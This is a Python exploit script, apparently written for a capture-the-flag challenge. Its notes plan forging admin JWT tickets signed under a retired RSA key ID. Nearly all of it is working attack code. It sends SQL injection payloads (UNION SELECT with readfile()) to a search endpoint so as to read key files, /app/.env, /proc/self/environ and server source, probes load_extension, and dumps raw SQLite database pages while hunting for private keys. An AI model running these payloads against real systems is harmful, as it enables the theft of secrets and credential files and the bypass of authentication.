"""
The PCAP shows JWT tickets signed with kid=legacy-rs256-retired.
The signature in pcap is fake ('expired-test-capture-signature').
But /api/auth/exchange IS a valid endpoint (returns 400/401, not 404).

Key insight: the server uses kid='legacy-rs256-retired' to select which
RSA public key to verify against. If we can find or crack that key,
we can forge admin tickets.

Strategy: Use SQLi to read files via sqlite_dbpage, or check if
the RSA key might be derivable from the user hashes.

Let's try another approach: use readfile() or other file-reading
SQLite extensions that might be loaded.
"""
from client import GhostClient

c = GhostClient()
c.bootstrap()

# Test if readfile extension is available
file_funcs = [
    ("readfile('/app/data/keys/legacy-rs256-retired.pem')", "readfile pem"),
    ("readfile('/app/keys/legacy-rs256-retired.pem')", "readfile keys"),
    ("readfile('/app/config/keys/legacy-rs256-retired.pem')", "readfile config"),
    ("readfile('/app/.env')", "readfile env"),
    ("readfile('/app/package.json')", "readfile pkg"),
    ("readfile('/etc/hostname')", "readfile hostname"),
    ("readfile('/proc/self/environ')", "readfile environ"),
    ("readfile('/proc/self/cmdline')", "readfile cmdline"),
    ("readfile('/app/server.js')", "readfile server"),
    ("readfile('/app/index.js')", "readfile index"),
    ("readfile('/app/src/index.js')", "readfile src"),
]

for func_call, label in file_funcs:
    q = f"' UNION SELECT 1, cast({func_call} as text), 3--"
    res = c.request("search", {"q": q})
    err = res.get("error", "")
    if "no such function" not in err and res.get("ok"):
        rows = [r for r in res["data"]["rows"] if r["id"] == 1]
        print(f"SUCCESS ({label}): {rows}")
    elif "no such function" in err:
        print(f"NO readfile() function available")
        break
    elif "not authorized" in err:
        print(f"readfile EXISTS but not authorized: {label}")
    else:
        print(f"  {label}: {err}")

# Alternative: try load_extension
print("\n--- Testing load_extension ---")
q = "' UNION SELECT 1, cast(load_extension('/tmp/x') as text), 3--"
res = c.request("search", {"q": q})
print(f"load_extension: {res.get('error', 'OK')}")

# Try using the hex dump of sqlite_dbpage to look for key material
# in the database file itself
print("\n--- Searching all DB pages for key material ---")
for pgno in range(1, 6):
    q = f"' UNION SELECT 1, cast({pgno} as text), hex(data) FROM sqlite_dbpage WHERE pgno={pgno}--"
    res = c.request("search", {"q": q})
    if res.get("ok"):
        rows = [r for r in res["data"]["rows"] if r["id"] == 1]
        for r in rows:
            try:
                raw = bytes.fromhex(r["summary"])
                # Look for PEM headers or key-related strings
                if b'BEGIN' in raw or b'KEY' in raw or b'PRIVATE' in raw or b'd3ctf' in raw or b'flag' in raw.lower():
                    print(f"FOUND KEY MATERIAL IN PAGE {pgno}!")
                    import re
                    for s in re.findall(b'[\x20-\x7e]{10,}', raw):
                        print(f"  {s.decode('ascii')}")
            except:
                pass
